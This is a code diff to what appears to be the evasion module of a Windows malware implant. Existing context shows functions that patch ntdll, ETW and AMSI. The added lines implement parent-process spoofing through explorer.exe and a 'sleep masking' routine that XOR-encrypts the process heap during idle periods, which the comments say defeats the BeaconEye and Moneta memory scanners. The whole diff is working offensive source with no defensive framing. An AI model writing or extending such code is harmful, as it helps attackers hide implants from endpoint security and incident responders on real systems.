@@ -11,6 +11,8 @@
 
 #include "evasion.h"
 #include "api.h"
+#include <bcrypt.h>
+#include <tlhelp32.h>
 #include <stdio.h>
 
 // =============================================
@@ -254,4 +256,65 @@ BOOL RunAllEvasion(VOID) {
     BOOL bEtw   = PatchEtw();
     BOOL bAmsi  = PatchAmsi();
     return bNtdll && bEtw && bAmsi;
+}
+
+// =============================================
+// 4. PPID SPOOFING
+// Open explorer.exe with PROCESS_CREATE_PROCESS so it can be used
+// as the spoofed parent in STARTUPINFOEXA attribute lists.
+// =============================================
+HANDLE GetSpoofParentHandle(VOID) {
+    HANDLE hParent = NULL;
+    PROCESSENTRY32W pe = { .dwSize = sizeof(PROCESSENTRY32W) };
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap == INVALID_HANDLE_VALUE)
+        return NULL;
+
+    if (Process32FirstW(hSnap, &pe)) {
+        do {
+            if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
+                hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pe.th32ProcessID);
+                break;
+            }
+        } while (Process32NextW(hSnap, &pe));
+    }
+    CloseHandle(hSnap);
+    return hParent;
+}
+
+// =============================================
+// 5. SLEEP MASKING (Heap Encryption)
+// XOR-encrypt every live heap block before sleeping, restore after.
+// Defeats BeaconEye / Moneta heap scanning while the implant is idle.
+// =============================================
+VOID MaskedSleep(DWORD dwMs) {
+    BYTE bKey = 0;
+    BCryptGenRandom(NULL, &bKey, 1, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
+
+    HANDLE hHeap = GetProcessHeap();
+    PROCESS_HEAP_ENTRY he = { 0 };
+
+    HeapLock(hHeap);
+    while (HeapWalk(hHeap, &he)) {
+        if ((he.wFlags & PROCESS_HEAP_ENTRY_BUSY) && he.cbData > 0) {
+            PBYTE p = (PBYTE)he.lpData;
+            for (SIZE_T i = 0; i < he.cbData; i++)
+                p[i] ^= bKey;
+        }
+    }
+    HeapUnlock(hHeap);
+
+    Sleep(dwMs);
+
+    // Restore: XOR back with same key (symmetric)
+    ZeroMemory(&he, sizeof(he));
+    HeapLock(hHeap);
+    while (HeapWalk(hHeap, &he)) {
+        if ((he.wFlags & PROCESS_HEAP_ENTRY_BUSY) && he.cbData > 0) {
+            PBYTE p = (PBYTE)he.lpData;
+            for (SIZE_T i = 0; i < he.cbData; i++)
+                p[i] ^= bKey;
+        }
+    }
+    HeapUnlock(hHeap);
 }
